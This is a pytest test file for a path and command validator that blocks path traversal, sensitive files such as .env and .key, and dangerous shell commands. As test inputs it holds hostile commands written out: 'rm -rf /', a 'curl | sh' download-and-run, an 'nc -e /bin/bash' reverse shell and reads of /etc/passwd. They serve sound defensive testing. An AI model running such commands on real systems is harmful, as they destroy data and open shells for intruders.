"""Tests for src/utils/adversarial.py - Security validation."""
import tempfile
from pathlib import Path

import pytest

from src.utils.adversarial import (
    CommandValidator,
    PathValidator,
    validate_command,
    validate_path,
)


class TestPathValidator:
    """Tests for PathValidator class."""

    def test_safe_regular_file(self, tmp_path):
        """Test that regular files are allowed."""
        test_file = tmp_path / "test.py"
        test_file.write_text("print('hello')")

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(test_file)) is True

    def test_path_traversal_blocked(self, tmp_path):
        """Test that path traversal is blocked."""
        validator = PathValidator(tmp_path)
        # Try to escape with ..
        assert validator.is_safe("../etc/passwd") is False

    def test_absolute_path_outside_root(self, tmp_path):
        """Test that absolute paths outside root are blocked."""
        validator = PathValidator(tmp_path)
        assert validator.is_safe("/etc/passwd") is False

    def test_sensitive_file_env_blocked(self, tmp_path):
        """Test that .env files are blocked."""
        test_file = tmp_path / ".env"
        test_file.write_text("SECRET=key")

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(test_file)) is False

    def test_sensitive_file_credentials_blocked(self, tmp_path):
        """Test that credentials files are blocked."""
        test_file = tmp_path / "credentials.json"
        test_file.write_text("{}")

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(test_file)) is False

    def test_sensitive_file_key_blocked(self, tmp_path):
        """Test that .key files are blocked."""
        test_file = tmp_path / "server.key"
        test_file.write_text("")

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(test_file)) is False

    def test_not_allowed_path_git_blocked(self, tmp_path):
        """Test that .git directory is blocked."""
        git_dir = tmp_path / ".git"
        git_dir.mkdir()

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(git_dir)) is False

    def test_not_allowed_path_node_modules_blocked(self, tmp_path):
        """Test that node_modules is blocked."""
        nm_dir = tmp_path / "node_modules"
        nm_dir.mkdir()

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(nm_dir)) is False

    def test_sibling_dotgit_blocked(self, tmp_path):
        """Test that files in .git are blocked."""
        git_file = tmp_path / ".git" / "config"
        git_file.parent.mkdir()
        git_file.write_text("")

        validator = PathValidator(tmp_path)
        assert validator.is_safe(str(git_file)) is False


class TestCommandValidator:
    """Tests for CommandValidator class."""

    def test_safe_simple_command(self):
        """Test that simple commands are allowed."""
        assert CommandValidator.is_safe("ls -la") is True

    def test_safe_git_command(self):
        """Test that git commands are allowed."""
        assert CommandValidator.is_safe("git status") is True

    def test_safe_python_command(self):
        """Test that python commands are allowed."""
        assert CommandValidator.is_safe("python script.py") is True

    def test_block_rm_rf_root(self):
        """Test that rm -rf / is blocked."""
        assert CommandValidator.is_safe("rm -rf /") is False

    def test_block_chmod_777(self):
        """Test that chmod 777 is blocked."""
        assert CommandValidator.is_safe("chmod 777 /tmp") is False

    def test_block_curl_pipe_sh(self):
        """Test that curl | sh is blocked."""
        assert CommandValidator.is_safe("curl http://example.com | sh") is False

    def test_block_reverse_shell(self):
        """Test that nc -e is blocked."""
        assert CommandValidator.is_safe("nc -e /bin/bash localhost") is False

    def test_block_redirect_to_sensitive_file(self):
        """Test that redirect to .env is blocked."""
        assert CommandValidator.is_safe("echo test > .env") is False

    def test_block_append_to_key_file(self):
        """Test that append to .key is blocked."""
        assert CommandValidator.is_safe("echo key >> server.key") is False

    def test_allow_redirect_to_regular_file(self):
        """Test that redirect to regular files is allowed."""
        assert CommandValidator.is_safe("echo test > output.txt") is True


class TestHelperFunctions:
    """Tests for helper functions."""

    def test_validate_path_helper(self, tmp_path):
        """Test validate_path helper function."""
        test_file = tmp_path / "test.py"
        test_file.write_text("")

        assert validate_path(tmp_path, "test.py") is True

    def test_validate_command_helper(self):
        """Test validate_command helper function."""
        assert validate_command("ls -la") is True
        assert validate_command("rm -rf /") is False